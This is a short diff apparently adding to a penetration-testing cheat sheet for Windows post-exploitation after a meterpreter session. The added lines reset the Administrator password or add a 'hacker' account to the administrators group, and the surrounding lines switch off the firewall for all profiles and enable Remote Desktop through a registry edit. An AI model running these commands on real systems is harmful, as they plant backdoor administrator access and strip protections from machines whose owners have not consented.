@@ -1,3 +1,15 @@
+
+If you have meterpreter session You can reset the Administrator password so you don't need to crack hash or create the new account.
+
+C:\>net user Administrator NewPassword123!
+
+OR
+
+C:\>net user hacker Password123! /add
+net localgroup administrators hacker /add
+
+
+
 netsh advfirewall set allprofiles state off
 
 reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
